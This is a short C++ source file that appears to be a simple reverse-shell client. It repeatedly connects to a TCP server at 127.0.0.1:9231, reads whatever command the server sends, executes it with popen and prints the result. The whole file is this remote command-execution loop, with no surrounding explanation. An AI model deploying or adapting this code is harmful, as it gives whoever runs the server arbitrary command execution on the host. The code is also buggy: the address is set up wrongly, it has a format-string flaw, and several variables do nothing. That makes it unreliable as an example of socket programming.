#include <sys/socket.h>
#include <cstdio>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <cstdlib>
#include <csignal>
#include <thread>
#include <strings.h>
#include <string.h>

int sock, finish = 0;
void stop(int signal)
{
	finish = 1;
	try{
		
		close(sock);
	}catch(...)
	{

	}
	exit(0);
}

char* exec(char command[])
{
	FILE *file = popen(command, "r");
	if (file==NULL)
	{
		printf("Cannot popen\n");
		stop(1);
	}
	int tanda = 0;
	char *output = (char *) calloc(sizeof(char), 1), temp;
	while ((temp=fgetc(file))!=EOF)
	{
		output[tanda] = temp;
		tanda+=1;
		output = (char*)realloc(output, sizeof(char)*(tanda+1));
	}
	output[tanda] = '\0';
	return output;
}

int com = 0;
void change()
{
	com = 1?com==0:0;
}


int main()
{
		sockaddr_in server_addr;
		bzero(&server_addr, sizeof(server_addr));
		char ip[] = "127.0.0.1";	
		int port = 9231;
		inet_pton(AF_INET, ip, &server_addr);
		server_addr.sin_family = AF_INET;
		server_addr.sin_port = htons(port);
		char to_send0[] = "command", to_send1[]="size";
		int size = 0;
		signal(SIGINT, ::stop);

	while (!(::finish))
	{
		sock = socket(AF_INET, SOCK_STREAM, 0);
		if (connect(sock, (sockaddr *) &server_addr, sizeof(server_addr))<0){printf("Cannot connect\n");stop(1);}
		char to_send0[] = "Hello there...\0",
		buffer0[100], buffer1[10];
		send(sock, to_send0, strlen(to_send0), 0);
		bzero(buffer0, sizeof(buffer0));
		//bzero(buffer1, sizeof(buffer1));
		read(sock, buffer0, 100);
		//read(sock, buffer1, 1);
		//printf("%s\n", buffer0);		
		//printf("%s\n", buffer1);		
		printf(exec(buffer0));
	}
}